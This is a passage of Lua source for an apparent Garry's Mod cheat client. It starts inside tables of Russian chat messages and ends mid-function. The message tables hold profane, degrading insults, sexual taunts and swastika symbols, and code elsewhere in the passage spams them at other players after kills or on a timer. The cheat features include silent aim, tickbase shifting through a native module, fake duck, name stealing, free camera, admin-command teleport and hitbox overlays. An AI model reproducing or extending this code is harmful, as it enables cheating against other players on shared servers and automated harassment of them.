            "че тут эта нищая собака заскулила",
            "не хотелось даже руки об тебя марать нищ сука",
            "ебать ты красиво на бутылку упал",
            "прости что без смазки)))",
            "алло это скорая? тут такая ситуация нищ упал))) ОЙ А ВЫ НИЩАМ ТО НЕ ПОМОГАЕТЕ?? ПОНЯТНО Я ПОЙДУ ТОГДА))))))))",
            "вырыгнись из окна нахуй боберхук юзер",
            "тяжело с мемсенсом наверно????",
            "nice chromosome count you sell??",
            "как ты на пк накопил даже не знаю )))))))))",
            "iq больше двух будет пмнешь ок????",
            "НИХУЯ ТАМ НЬЮКАМЫЧА ОРОШИЛИ СТРУЕЙ МОЧИ АХАХХАХАХАХАХАХАХА",
            "дал юид за щеку проверяй",
        },
        [3] = {
		"хуевый ресолвер",
		"хуевые фейклаги",
		"хуевый антиаим",
		"хуевый спинбот",
		"хуевый бхоп",
		"хуевый аим",
		"найс паста аимвара",
		"найс паста мемевара",
		"неужели это идиотбокс???",
		"ого идиотбокс???",
		"неужели это аосхак???",
		"ого аосхак???",
		"неужели это ехек хак???",
		"ого ехек хак???",
		"что за ебанутый у тебя чит?",
		"ez",
		"ezz",
		"изи",
		"ииииииизи",
		"упал",
		"спи",
		"отдыхай",
		"отлетел дебил)",
		"упал пастер",
		"пастер лег",
		"изи даун",
		"ору отлетела дура",
		"найс ресолвер стен",
		"найс ресолвер деревьев",
		"бро имажин ресолвинг ин гмод",
		"улетел фанат артемкинга4",
		"упал фанат артемкинга4",
		"ты куда стреляешь)))",
		"упал ннчик без самоваре",
		"умер ннчик без самоваре",
		"отдыхай ннчик без самоваре",
		"упал подписчик урбанички",
		"умер подписчик урбанички",
		"отдыхай подписчик урбанички",
		"енжинпред где???",
		"антиаим где???",
		"фейклаги где???",
		"антиаим не спас",
		"фейклаги не спасли",
		"даун с пастой отлетел",
		"упал баимер ебаный",
		"отлетел ебаный баимер))",
		"охуеть даун с пастой аимвара",
		"упал дебил",
		"выйди не позорься",
		"найс брейн иссуе",
		"найс кфг иссуе",
		"сука не позорься и ливни лол",
		"*DEAD* пофикси нищ",
		"нищий улетел",
		"набутылирован лол",
		"ебать ты красиво на бутылку упал",
		"хуя тебя опустили))",
		"прости что без смазки)",
		"обоссан",
		"обоссал юзера пасты аимвара",
		"алло это скорая? тут такая ситуация нищ упал)))",
		"на завод иди",
		"ебать тебя унесло",
		"ой нищий упал щас скорую вызовем",
		"научи потом как так сосать на хвх",
		"нихуя ты там как самолет отлетел",

        },
        [4] = {
	"Навальный топчик",
	"Навальный топчик",
	"Навальный топчик",
	"Навальный топчик,за него Тверскую топчем",
	"Навальный топчик,за него Тверскую топчем",
	"Нью Бэланс кеды, прилипли к подошве гетры",
	"Но сегодня в центре в них устроим веселье",
	"Мы отсюда не свалим",
	"Все кто дома - не с нами",
	"Мы тут просто гуляем",
	"В нашем сердце весна В нашем сердце весна",
	"В нашем сердце весна",
	"Навальный топчик,за него Тверскую топчем",
	"Навальный топчик,скажем громче",
	"Навальный топчик,за него Тверскую топчем",
	"Навальный топчик,",
	"Навальный топчик,за него Тверскую топчем",
	"Тверскую топчем",
	"Вокруг так много космонавтов",
	"МКС полицейский пазик",
	"Лица скрывают каски,маски",
	"Становиться опасно,но",
	"Мы устроим пляски",
	"Дружно,под эти песни",
	"Вся Тверская в курсе",
	"Вся Тверская денсит",
	"Тверская денсит",
	"Тверская денсит",
	"Денсит",
	"Навальный топчик,за него Тверскую топчем",
	"Навальный топчик,скажем громче",
	"Навальный топчик,за него Тверскую топчем",
	"Навальный топчик,",
	"Навальный топчик,за него Тверскую топчем",
	"Тверскую топчем",
	"Навальный топчик",
	"15 суток, нам нет места от скуки",
	"Ждем когда вернешься, Навальный Леша",
	"Время летит быстро,скоро новая вписка",
	"Мы не пойдем на пары если,Навальный с нами",
	"Навальный с нами,давай с нами",
	"Навальный с нами, пойдем тусить с нами",
	"Навальный с нами, давай с нами",
	"Давай с нами, пойдем тусить с нами",
	"Этому городу нужен герой",
	"Леша Навальный, мы с тобой",
	"Этой стране нужен герой",
	"Леша Навальный, мы с тобой",
	"Этой планете нужен герой",
	"Леша Навальный, мы с тобой",
	"Этой Вселенной нужен герой",
	"Леша Навальный, мы с тобой",
	"Этой Вселенной нужен герой",
	"Леша Навальный, мы с тобой",
	"Леша Навальный, мы с тобой",
            "зуб даю у навального лехи самые мягкие сиськи",
        },
        [5] = {
         "я ЂÖг ₸ӹ ԉÖχ",
         "I am ♛ you noob",
         "{X}o4y kak PR0™ moGy kak DNO",
         "(‿!‿) Попа ищет ПрИкЛюченИй•",
         "٠●•۩۞۩[̲̲̅И̲̅Д̲̅И̲̲̅(ٿ)̲̅H̲̅A̲̅X̲̅У̲̅Й]۩۞۩•●٠",
         "DOLBIT N0RMALNO",
         "♛Truckach♛.CFG injecting",
         "Держи ✈ и лети нахуй !",
         "(Ауф)ᶜʸᵇᵉʳˢᵖᵒʳᵗЯ VIP А ТЫ RIP",
         "çŤᵱẮχ çŤᵱẮχ çŤᵱẮχ çŤᵱẮχ çŤᵱẮχ çŤᵱẮχ",
         "Следующая остановка – голова",
         "ᵗᵠ ᵉᵇᵃⁿᵘˡˢʸᵃ?",
         "!!!!ОР ВЫШЕ ГОР!!!!",
         "-===≡≡≡( ͝° ͜ʖ͡°) сперма летит тебе в FACE",
         "(っ´ཀ`)っ  ⋃  соси!!1",
         "★А мНе ВсЁ пОфИг★",
         "ОРЕЛ-КАВКАЗА ЛЕТИТ ВЕРШИТЬ СУДЬБУ",
         "•ЯАШОТТЕБЕ~ХЭДШОТ•",
         "Ð•Ē•M•Ø•Ŋ KILLED YOU",
         "•Я_tOT_komy_HaBce||OX•",
         "༼ つ ◕_◕ ༽つ {лежи ннчик}",
         "4iTeRoc_Ha_SeRvErE",
         "ЂΣƊOŁ∆G∆",
         "АхТы?НеГодЯй!",
         "-n๏ȼąȼέʍȼя?",
         "TRUCKACH.TECH RELEASE ACTIVATED ....",
         "%s EB@NYHKA S CHITOM",
         "给这个亚洲人吹箫",
        },
                [6] = {
                        "✰Р@C-I_I_I-ИР3НИ3 Т3РРИТ0РИИ✰ ☬П0ЖИР@Т3Лb☬М0ZG0B☬",
        "✄τℰЛℰФОH ∂óℬℰ尸ИЯ ОTҠЛОHЯℰT ℳÖน ℨℬОHҠИ ☏☬",
        "KAZAHE☢️ SILE  ͡๏̯͡๏ TI ☠️ MOGILE ۩☬",
        "ЛЕТИ %s ТЫ СВОБОДЕН! <(`▽´)>☬",
        "†(•̪●)† G3T D0WN! L0S3R!!!!☬",
        "Stͥⱥnͣdͫoffﾂ ᵒᶠᶠᶤᶜᶤᵃˡ☬",
        "⚠⚠_WARING_⚠⚠ { %s ] SCP 279 ==[CODE: HVH LOSER]☬",
        "卐卐卍卐卐卍卐卐卐卐 HАЙДИТЕ 10 ОТЛИЧИЙ!☬",
        "%s 36@Tb, T36R V0VAN ADIDAS  [-={3@0ВНИЛ}=-]!!!☬",
        "%s Тbl 6bl Y6иT ツMELLSTROY2012HACKERツ ☬",
        "♠Не КиСнИ,в КоНтАкТе ЗаВиСнИ♥♠",
        "%s УЛЫБНИСЬ ☻☬",
        "собираю apмию против фанатов А4! [(•̪●) A4LOH] копируй и paсстaвляй тaм где A☬",
        "[̲̅$̲̅(◣_◢)̲̅$̲̅] U LOS3 TH1S G@M3☬",
        "%s, юзает пасту сережехак в6 пастед бу ILYAtrasher$",
        "ᴇꜱʟɪ ʏᴀ xᴏʀᴏʜᴏ ɪɢʀᴀɪ ᴇᴛᴏ ɴᴇ ᴢɴᴀʜɪᴛ ʜᴛᴏ ʏᴀ ᴄʜᴇᴀᴛᴇʀ",
        "нож - скамнул✔♕        Я ПЕРСОН  V I P  ТЫ ПАЦАН ВЛИП     ?",
        "часы - накрутил✔⼺  ⼺㆔[̲̅Х̲̅][̲̅а̲̅][̲̅р̲̅][̲̅а̲̅][̲̅к̲̅][̲̅т̲̅][̲̅е̅ [̲̅р]",
        " 一♣️ u suk♡︎◕︎‿︎◕︎​",
        "$$$ 1 TAP BY ME $$$ ∩ ( ͡⚆ ͜ʖ ͡⚆) ∩",
        "Ты К@К-т0 Н3ЖН0 СТbIлRЕШЬ ТЫ ЧТО НОВИЧ0К?",           
        },
    }


// Init player vars
gameevent.Listen( "player_spawn" )
gameevent.Listen( "player_activate" )
gameevent.Listen( "entity_killed" )

function ultimate.entity_killed(data)
	local aid = Entity(data.entindex_attacker)
	local vid = Entity(data.entindex_killed)

    if aid == pLocalPlayer and aid != vid and !vid:IsNPC() and (vid:IsPlayer() or vid:IsBot() ) then
        if ultimate.cfg.vars["Killsay"] then
            local chatPrefixes = {
                [2] = "/ooc ",
                [3] = "/ad "
            }

            local chatGroup = ultimate.cfg.vars["Killsay group"]

            local prefix = chatPrefixes[chatGroup] or ""

            local tbl = ultimate.chatmsg[ ultimate.cfg.vars["Killsay mode"] ]
            local str = prefix .. tbl[ math.random( 1, #tbl ) ]

            if str:find("%s") then str = str:format(vid:Nick()) end

            RunConsoleCommand( "say", str )
        end

        if ultimate.cfg.vars["Killsound"] then
            surface.PlaySound( ultimate.cfg.vars["Killsound str"] )
        end


    end
end



function ultimate.updatePlayerVars( data )
    local id = data.userid

    local ply = Player( id )

    ply.ult_prev_pos = Vector()
    // ply.ult_prev_hitbox_pos = Vector()

    ply.ult_prev_simtime = 0
    ply.flticks = 0

    ply.simtime_updated = false
    ply.break_lc = false
    ply.fakepitch = false

    ultimate.btrecords[ ply ] = {}
    ultimate.predicted[ ply ] = {}
end



















// Menu hints

function ultimate.DrawMenuHints()
    if not ultimate.frame:IsVisible() then return end

    if not ultimate.hint then
        ultimate.hintText = ""
        return
    end

    surface.SetTextColor(ultimate.Colors[165])
    surface.SetFont("DermaSmall")

    local tw, th = surface.GetTextSize(ultimate.hintText)

    surface.SetDrawColor(ultimate.Colors[35])
    surface.DrawRect(ultimate.hintX,ultimate.hintY,tw+20,th+10)
    surface.SetDrawColor(ultimate.Colors[54])
    surface.DrawOutlinedRect(ultimate.hintX,ultimate.hintY,tw+20,th+10,1)

    surface.SetTextPos(ultimate.hintX+10,ultimate.hintY+5)
    surface.DrawText(ultimate.hintText)

    ultimate.hint = false
end

function ultimate.DrawOverlay()
    if ultimate.UnSafeFrame then return end

    ultimate.DrawMenuHints()
end






/*
    Libs -> Color
*/



//function ultimate.


function ultimate.ColorLerp( first, second )
    local FT = FrameTime() * 350

    first.r = math.Approach( first.r, second.r, FT )
    first.g = math.Approach( first.g, second.g, FT )
    first.b = math.Approach( first.b, second.b, FT )
    first.a = math.Approach( first.a, second.a, FT )

    math.Round( first.r, 0 )
    math.Round( first.g, 0 )
    math.Round( first.b, 0 )
    math.Round( first.a, 0 )

    return first
end

function ultimate.ColorEqual( first, second )
    if first.r != second.r or first.g != second.g or first.b != second.b or first.a != second.a then
        return false
    end

    return true
end





/*
    hooks -> Think
*/

ultimate.ekd = false
ultimate.ekd2 = false
ultimate.ekd3 = false
ultimate.fbkd = false

// Dancer ( act / taunt spam )

ultimate.nextact = 0
ultimate.nextTaunt2 = 0
ultimate.actCommands = {"robot","muscle","laugh","bow","cheer","wave","becon","agree","disagree","forward","group","half","zombie","dance","pers","halt","salute"}
ultimate.actCommands2 = {"frenzy", "melee2", "poke", "attack", "melee"}

// Name changer

do
    local cooldown = GetConVarNumber("sv_namechange_cooldown_seconds")
    local curtime = CurTime()
    local lastname = pLocalPlayer:Name()
    local changed = 0

    local function check(pl,mn,ptbl)
        if pl == pLocalPlayer then return false end

        if pl:Name() == mn then return false end

        if #ptbl > 5 then
            if lastname == pl:Name() then return  false end
        end

        return true
    end

    local function changename(name)
        jopa.NetSetConVar("name",name.." ")

        if changed >= 2 then
            changed = 0
            lastname = name
        else
            changed = changed + 1
        end

        curtime = CurTime() + cooldown
    end

    function ultimate.nameChanger()
        if curtime > CurTime() then return end

        local pltbl = player.GetAll()

        local len = pLocalPlayer:Name():len()

        local mname = string.sub(pLocalPlayer:Name(),1,len-1)

        local i = math.random(1,#pltbl)

        if not check(pltbl[i],mname,pltbl) then return end

        changename(pltbl[i]:Name())
    end
end

do
    local tply
    local chatdelay = CurTime()
    local inverterdown = false

    function ultimate.Think()
        if input.IsKeyDown(KEY_END) then
            ultimate.Unload()
        end

        if input.IsKeyDown(KEY_DELETE) and not ultimate.kd then
            ultimate.togglevisible()

            CloseDermaMenus()
        end

        ultimate.kd = input.IsKeyDown(KEY_DELETE)

        if ultimate.IsKeyDown( ultimate.cfg.binds["Ent add"] ) and not ultimate.ekd then
            local tr = pLocalPlayer:GetEyeTrace().Entity

            if IsValid( tr ) then
                local class = tr:GetClass()

                //print(ultimate.cfg.ents[ class ] )

                if not ultimate.cfg.ents[ class ] then
                   ultimate.cfg.ents[ class ] = true
                else
                   ultimate.cfg.ents[ class ] = not ultimate.cfg.ents[ class ]
                end
            end
        end

if ultimate.IsKeyDown(ultimate.cfg.binds["Player add"]) and not ultimate.ekd2 then
    local tr = pLocalPlayer:GetEyeTrace().Entity

    if IsValid(tr) and tr:GetClass() == "player" then 
        local steamId = tr:SteamID()

        if not ultimate.cfg.friends[steamId] then
            ultimate.cfg.friends[steamId] = true
        else
            ultimate.cfg.friends[steamId] = nil
        end
    end
end

if ultimate.IsKeyDown(ultimate.cfg.binds["Priority add"] or KEY_F4) and not ultimate.ekd3 then
    local tr = pLocalPlayer:GetEyeTrace().Entity

    if IsValid(tr) and tr:GetClass() == "player" then 
        local steamId = tr:SteamID()

        if not ultimate.cfg.priorityList[steamId] then
            ultimate.cfg.priorityList[steamId] = true
            print("[Priority] Добавлен игрок: "..tr:Name())
        else
            ultimate.cfg.priorityList[steamId] = nil
            print("[Priority] Удален игрок: "..tr:Name())
        end
    end
end

        if ultimate.cfg.vars["Inverter"] and ultimate.IsKeyDown( ultimate.cfg.binds["Inverter"] ) and not inverterdown then
            ultimate.inverted = !ultimate.inverted
        end

        inverterdown = ultimate.IsKeyDown( ultimate.cfg.binds["Inverter"] )

        ultimate.ekd = ultimate.IsKeyDown( ultimate.cfg.binds["Ent add"] )
        ultimate.ekd2 = ultimate.IsKeyDown( ultimate.cfg.binds["Player add"] )
        ultimate.ekd3 = ultimate.IsKeyDown( ultimate.cfg.binds["Priority add"] )

        if ultimate.IsKeyDown( ultimate.cfg.binds["Fullbright"] ) and not ultimate.fbkd then
            ultimate.fbe = not ultimate.fbe
        end

        ultimate.fbkd = ultimate.IsKeyDown( ultimate.cfg.binds["Fullbright"] )

        if ultimate.cfg.vars["FSpec ClickTP"] and ultimate.IsKeyDown( ultimate.cfg.binds["FSpec ClickTP"] ) then
            local pos = pLocalPlayer:GetEyeTrace().HitPos

            //print(pos)

            //RunConsoleCommand( "ba", "spec" )

            RunConsoleCommand( "FTPToPos", string.format("%d, %d, %d", pos.x, pos.y, pos.z), string.format("%d, %d, %d", 0, 0, 0) )
        end



        // ultimate.cfg.vars["FSpec Teleport"] = false
        // ultimate.cfg.binds["FSpec Teleport"] = 0

        // ultimate.cfg.vars["FSpec Masskill"] = false
        // ultimate.cfg.binds["FSpec Masskill"] = 0

        // ultimate.cfg.vars["FSpec Velocity"] = false
        // ultimate.cfg.binds["FSpec Velocity"] = 0

        if ultimate.cfg.vars["Chat spammer"] and CurTime() > chatdelay then
            local chatPrefixes = {
                [2] = "/ooc ",
                [3] = "/ad "
            }

            local chatGroup = ultimate.cfg.vars["Chat group"]

            local prefix = chatPrefixes[chatGroup] or ""

            local tbl = ultimate.chatmsg[ ultimate.cfg.vars["Chat mode"] ]
            local str = prefix .. tbl[ math.random( 1, #tbl ) ]

            local players   = player.GetAll()

            local random_ply = players[ math.random( 1, #players ) ]
            if random_ply == pLocalPlayer then return end

            str = string.format( str, ultimate.playerCache[ random_ply ].Name )

            RunConsoleCommand("say", str)

            chatdelay = CurTime() + ultimate.cfg.vars["Chat delay"]
        end

        if ultimate.cfg.vars["Name stealer"] then ultimate.nameChanger() end

        if ded and jopa.GetCurrentCharge and jopa.GetCurrentCharge() < ultimate.cfg.vars["Shift ticks"] then jopa.StartShifting( false ) end

        if ultimate.cfg.vars["Tickbase shift"] then
            if ultimate.IsKeyDown( ultimate.cfg.binds["Tickbase shift"] ) then
                jopa.StartShifting( true )
            end

            local shouldcharge = ded and jopa.GetCurrentCharge and jopa.GetCurrentCharge() < ultimate.cfg.vars["Charge ticks"] and ultimate.IsKeyDown( ultimate.cfg.binds["Auto recharge"] )

            jopa.StartRecharging( shouldcharge )

            if shouldcharge then
                jopa.StartShifting( false )
            end
        end

        if ultimate.cfg.vars["Taunt spam"] and ultimate.nextact < CurTime() and pLocalPlayer:Alive() and !pLocalPlayer:IsPlayingTaunt() then
            local act = ultimate.actCommands[ultimate.cfg.vars["Taunt"]]

            RunConsoleCommand("act", act)
            ultimate.nextact = CurTime() + 0.3
        end

        if ultimate.cfg.vars["Taunt spam 2"] and pLocalPlayer:Alive() and CurTime() >= ultimate.nextTaunt2 then
            local act = ultimate.actCommands2[ultimate.cfg.vars["Taunt 2"]]

            RunConsoleCommand("act2", act)
            ultimate.nextTaunt2 = CurTime() + 0.2
        end

        if ultimate.cfg.vars["Yaw base"] == 2 then
            tply = ultimate.GetSortedPlayers( 1, 0, 1, false )

            if tply then
                ultimate.aatarget = tply[1][1]
            end
        end

        if ultimate.cfg.vars["Auto peak"] then
            ultimate.autopeakThink()
        end
    end
end


/*
    hooks -> CalcView
*/

ultimate.vieworigin = pLocalPlayer:EyePos()
ultimate.viewfov    = 0
ultimate.znear      = 0

ultimate.tpenabled = false
ultimate.tptoggled = false

ultimate.fcvector = pLocalPlayer:EyePos()
ultimate.fcangles = pLocalPlayer:EyeAngles()
ultimate.fcenabled = false
ultimate.fctoggled = false


/* // TODO
ultimate.checkbox("Collision","Third person collision",p:GetItemPanel())
ultimate.checkbox("Smoothing","Third person smoothing",p:GetItemPanel())

ultimate.slider("X","Viewmodel x",1,180,0,p:GetItemPanel())
ultimate.slider("Y","Viewmodel y",1,180,0,p:GetItemPanel())
ultimate.slider("Z","Viewmodel z",1,180,0,p:GetItemPanel())
ultimate.slider("Roll","Viewmodel r",1,360,0,p:GetItemPanel())
*/

ultimate.cameraHullMax = Vector( 3, 3, 3 )
ultimate.cameraHullMin = Vector( -3, -3, -3 )
function ultimate.CalcView( ply, origin, angles, fov, znear, zfar )
    if ultimate.UnSafeFrame then
        return { origin = origin, angles = angles, fov = fov }
    end

    local view = {}

    local tppressed = ultimate.IsKeyDown(ultimate.cfg.binds["Third person"])
    local fcpressed = ultimate.IsKeyDown(ultimate.cfg.binds["Free camera"])

    if ultimate.cfg.vars["Third person"] and tppressed and not ultimate.tptoggled then
        ultimate.tpenabled = not ultimate.tpenabled
    end

    if ultimate.cfg.vars["Free camera"] and fcpressed and not ultimate.fctoggled then
        ultimate.fcenabled = not ultimate.fcenabled
        ultimate.fcangles = pLocalPlayer:EyeAngles()
    elseif ultimate.fcenabled and not ultimate.cfg.vars["Free camera"] then
        ultimate.fcenabled = false
    end

    ultimate.tptoggled = tppressed
    ultimate.fctoggled = fcpressed


    if ultimate.cfg.vars["Fake duck"] and ultimate.IsKeyDown(ultimate.cfg.binds["Fake duck"]) then
        origin.z = pLocalPlayer:GetPos().z + 64
    end

    local fangs = ultimate.cfg.vars["Silent aim"] and ultimate.SilentAngle or angles

    //angles = fangs
    //if not ultimate.cfg.vars[ "Norecoil" ] then
    //    angles:Add( ply:GetViewPunchAngles() )
    //end

    if ultimate.fcenabled then
        local speed = ultimate.cfg.vars["Free camera speed"]

        if input.IsKeyDown(KEY_W) then
            ultimate.fcvector = ultimate.fcvector + ultimate.SilentAngle:Forward() * speed
        end

        if input.IsKeyDown(KEY_S) then
            ultimate.fcvector = ultimate.fcvector - ultimate.SilentAngle:Forward() * speed
        end

        if input.IsKeyDown(KEY_A) then
            ultimate.fcvector = ultimate.fcvector - ultimate.SilentAngle:Right() * speed
        end

        if input.IsKeyDown(KEY_D) then
            ultimate.fcvector = ultimate.fcvector + ultimate.SilentAngle:Right() * speed
        end

        if input.IsKeyDown(KEY_SPACE) then
            ultimate.fcvector.z = ultimate.fcvector.z + speed
        end

        if input.IsKeyDown(KEY_LSHIFT) then
            ultimate.fcvector.z = ultimate.fcvector.z - speed
        end

        view.origin = ultimate.fcvector
        view.angles = fangs
        view.fov = ultimate.cfg.vars["Fov override"]
        view.drawviewer = !ultimate.cfg.vars["Ghetto free cam"]
    else
        ultimate.fcvector = origin
        view.origin = ultimate.tpenabled and origin - ( (fangs):Forward() * ultimate.cfg.vars["Third person distance"] ) or origin

        if ultimate.tpenabled and ultimate.cfg.vars["Third person collision"] then
            local tr = {}

            tr.start = origin
            tr.endpos = origin - ( (fangs):Forward() * ultimate.cfg.vars["Third person distance"] )
            tr.mins = ultimate.cameraHullMin
            tr.maxs = ultimate.cameraHullMax
            tr.filter = ply
            tr.mask = MASK_BLOCKLOS

            local res = TraceHull( tr )

            view.origin = res.HitPos
        end

        view.angles = fangs
        view.fov = ultimate.cfg.vars["Fov override"]
        view.drawviewer = ultimate.tpenabled
    end

    ultimate.vieworigin = ( ultimate.cfg.vars["Ghetto free cam"] and ultimate.fcenabled ) and ultimate.fcvector or origin
    ultimate.viewfov    = view.fov
    ultimate.znear      = znear

    if ( not ultimate.cfg.vars["Override view"] ) then
        if ( math.floor( fov ) ~= GetConVar( "fov_desired" ):GetFloat() ) then
            view.fov = fov
        end

        local pVehicle = pLocalPlayer:GetVehicle()

        if ( IsValid( pVehicle ) ) then
            view = hook.Run( "CalcVehicleView", pVehicle, ply, view )
        end

        local pWeapon = pLocalPlayer:GetActiveWeapon()

        if ( IsValid( pWeapon ) ) then
            local pWeaponCalcView = pWeapon.CalcView

            if ( pWeaponCalcView ) then
                local origin, angles, fov = pWeaponCalcView( pWeapon, ply, Vector( view.origin ), Angle( view.angles ), view.fov )
			    view.origin, view.angles, view.fov = origin or view.origin, angles or view.angles, fov or view.fov
            end
        end
    end
	return view
end

function ultimate.GetFovRadius()
    local Radius = ultimate.cfg.vars["Aimbot FOV"]

    local Ratio = screenWidth / screenHeight
    local AimFOV = Radius * (math.pi / 180)
    local GameFOV = ultimate.viewfov * (math.pi / 180)
    local ViewFOV = 2 * math.atan(Ratio * (ultimate.znear / 2) * math.tan(GameFOV / 2))



    return (math.tan(AimFOV) / math.tan(ViewFOV / 2)) * screenWidth
end

function ultimate.CalcViewModelView(wep, vm, oldPos, oldAng, pos, ang)

    pos = ultimate.vieworigin
	ang = ultimate.cfg.vars["Silent aim"] and ultimate.SilentAngle or ang

    if ultimate.cfg.vars["Viewmodel Manip"] then
        local OverridePos = Vector(
            ultimate.cfg.vars["Viewmodel x"],
            ultimate.cfg.vars["Viewmodel y"],
            ultimate.cfg.vars["Viewmodel z"]
        )

        local vmAngles = Angle(ang.p, ang.y, ang.r)

        pos = pos + vmAngles:Right() * OverridePos.x
        pos = pos + vmAngles:Forward() * OverridePos.y
        pos = pos + vmAngles:Up() * OverridePos.z
    end

    return pos, ang
end

/*
    hooks -> Pre / Post DrawViewModel
*/

do
    local drawing = false

    function ultimate.PreDrawViewModel( vm, ply, w )
        if ultimate.UnSafeFrame then return end
        if ply != pLocalPlayer then return end

        if ultimate.cfg.vars["Viewmodel chams"] then
            local col = string.ToColor( ultimate.cfg.colors["Viewmodel chams"] )
            ultimate.chamMats.vis[6]:SetVector( "$envmaptint", Vector( col.r / 255, col.g / 255, col.b / 255 ) )
            local mat = ultimate.chamMats.vis[ultimate.cfg.vars["Viewmodel chams type"]]

            render.SetBlend(col.a/255)
            render.SetColorModulation(col.r/255,col.g/255,col.b/255)
            render.MaterialOverride(mat)
        end

        if ultimate.cfg.vars["Fullbright viewmodel"] then
            render.SuppressEngineLighting( true )
        end

        if ultimate.cfg.vars["Viewmodel changer"] and ultimate.cfg.vars["Viewmodel fov"] != GetConVar("viewmodel_fov"):GetInt() and not drawing then
            cam.Start3D(nil, nil, ultimate.cfg.vars["Viewmodel fov"])

                drawing = true

                render.DepthRange( 0, 0.01 )

                vm:DrawModel()

                render.DepthRange( 0, 1 )

                drawing = false

            cam.End3D()
        else
            return
        end

        return true
    end

end

function ultimate.PostDrawViewModel( vm, ply, w )
    render.SetColorModulation(1, 1, 1)
    render.MaterialOverride()
    render.SetBlend(1)
    render.SuppressEngineLighting(false)
end

/*
    hooks -> OnImpact ( c++ module )
*/
ultimate.bulletImpacts = {}

function ultimate.OnImpact( data )
    local startpos = data.m_vStart

    if ultimate.cfg.vars[ "Bullet tracers muzzle" ] and data.m_vStart == pLocalPlayer:EyePos() then
        local vm = pLocalPlayer:GetViewModel()
	    local wep = pLocalPlayer:GetActiveWeapon()

        if vm && IsValid( wep ) && IsValid( vm ) then
            local muzzle = vm:LookupAttachment( "muzzle" )

		    if muzzle == 0 then
			    muzzle = vm:LookupAttachment( "1" )
		    end

            if vm:GetAttachment( muzzle ) then
                startpos = vm:GetAttachment( muzzle ).Pos
            end
        end
    end

    ultimate.bulletImpacts[#ultimate.bulletImpacts + 1] = {
        shootTime = CurTime(),
        startPos = startpos,
        endPos = data.m_vOrigin,
        hitbox = data.m_nHitbox,
        alpha = 255
    }
end




/*
    hooks -> PostDrawOpaqueRenderables
*/

do
    local oldtrmat = ultimate.cfg.vars["Bullet tracers material"]
    local tracemat = Material("effects/beam_generic01")

    local realcolor, fakecolor, lbycolor = Color( 0, 255, 0 ), Color( 255, 0, 0 ), Color( 0, 0, 255 )



    function ultimate.PostDrawOpaqueRenderables()

        if ultimate.UnSafeFrame then return end

        if ultimate.cfg.vars["Bullet tracers"] then
            local trmat = ultimate.cfg.vars["Bullet tracers material"]

            if trmat != oldtrmat then
                tracemat = Material( trmat )
                oldtrmat = trmat
            end

            render.SetMaterial( tracemat )

            local tracercolor = string.ToColor(ultimate.cfg.colors["Bullet tracers"])
            local oldAlpha = tracercolor.a

            local curTime = CurTime()
            local dieTime = ultimate.cfg.vars["Tracers die time"]

            for i = #ultimate.bulletImpacts, 1, -1 do
                local impact = ultimate.bulletImpacts[i]

                if (curTime - impact.shootTime) > dieTime then
                    table.remove(ultimate.bulletImpacts, i)
                    continue
                end

                tracercolor.a = 255 - ( ( curTime - impact.shootTime ) / dieTime * 255 )

                render.DrawBeam( impact.startPos, impact.endPos, 1, 1, 1, tracercolor )
            end

            tracercolor.a = oldAlpha
        end

        if ultimate.cfg.vars["Hitbox"] then
            if not IsValid(ultimate.fakeModel) then return end
            if not pLocalPlayer:Alive() then return end
            if ultimate.hideHitboxes then return end
            if not pLocalPlayer:ShouldDrawLocalPlayer() then return end

            local mymodel = pLocalPlayer:GetModel()
            if ultimate.newModel ~= mymodel then
                ultimate.fakeModel = ultimate.CS_Model(mymodel)
                ultimate.newModel = mymodel
            end

            local tbl = {
                layers = ultimate.fakeAngles.layers,
                angles = ultimate.fakeAngles.angle,
                sequence = ultimate.fakeAngles.seq,
                cycle = ultimate.fakeAngles.cycle,
                origin = ultimate.fakeAngles.origin,
                movex = ultimate.fakeAngles.movex,
                movey = ultimate.fakeAngles.movey,
            }
            ultimate.CS_Model_update(pLocalPlayer, ultimate.fakeModel, tbl)

            if ultimate.fakeModel:GetHitBoxGroupCount() ~= nil then
                cam.Start3D(EyePos(), EyeAngles())
                    for group = 0, ultimate.fakeModel:GetHitBoxGroupCount() - 1 do
                        for hitbox = 0, ultimate.fakeModel:GetHitBoxCount(group) - 1 do
                            local bone = ultimate.fakeModel:GetHitBoxBone(hitbox, group)
                            if not bone then continue end

                            local pos, ang = ultimate.fakeModel:GetBonePosition(bone)
                            if not pos then continue end

                            local mins, maxs = ultimate.fakeModel:GetHitBoxBounds(hitbox, group)
                            render.DrawWireframeBox(
                                pos,
                                ang,
                                mins,
                                maxs,
                                string.ToColor(ultimate.cfg.colors["Hitbox"]),
                                true
                            )
                        end
                    end
                cam.End3D()
            end
        end



        if ultimate.cfg.vars["Auto peak"] and ultimate.startedPeeking then
            ultimate.drawAutopeak()
        end


        ultimate.DrawCStrafePath()


    end
end

/*
    hooks -> FrameStageNotify ( c++ module )
*/

function ultimate.GetUserGroup(ply)
    if ply.GetUserGroup then
        return ply:GetUserGroup()
    elseif ply.GetRankTable and ply:GetRankTable().NiceName then
        // fix for RusEliteRP
        return ply:GetRankTable().NiceName
    else
        return "unknown"
    end
end

function ultimate.GetTeam( ply )
    local iTeam = ply:Team()

    if rp and rp.GetJobWithoutDisguise then
        local index = rp.GetJobWithoutDisguise( ply:EntIndex() )
        local tbl = rp.jobs.List[ index ]

        return index, tbl.Name, tbl.Color
    else
        return iTeam, team.GetName(iTeam), team.GetColor(iTeam)
    end
end

// Player data tables

ultimate.playerCache = {}

function ultimate.playerTableUpdate( ply )
    if not ultimate.playerCache[ ply ] then
        ultimate.playerCache[ ply ] = {}
    end

    local v = ultimate.playerCache[ ply ]

    v.entity = ply

    v.Name = ply:Name()

    local index, name, color = ultimate.GetTeam( ply )

    v.Team = index
    v.TeamColor = color
    v.TeamName = name

    v.GetUserGroup = ultimate.GetUserGroup(ply)

    v.Health = ply:Health()
    v.GetMaxHealth = ply:GetMaxHealth()

    v.Armor = ply:Armor()
    v.GetMaxArmor = ply:GetMaxArmor()

    v.GetPos = ply:GetPos()

    v.ObserverMode = ply:GetObserverMode()
    v.ObserverTarget = ply:GetObserverTarget()

    local w = ply:GetActiveWeapon()

    v.WeaponClass = IsValid(w) and ( ultimate.cfg.vars["Weapon printname"] and language.GetPhrase( w:GetPrintName() ) or w:GetClass() ) or "Unarmed"
    v.WeaponAmmo = IsValid(w) and w:Clip1() or "-"

    v.MoneyVar = MetaPlayer.getDarkRPVar and DarkRP.formatMoney(ply:getDarkRPVar("money")) or "beggar"
end

function ultimate.playerDataUpdate( )

    ultimate.playerCache = {}

    local plys = player.GetAll()

                for i = 1, #plys do
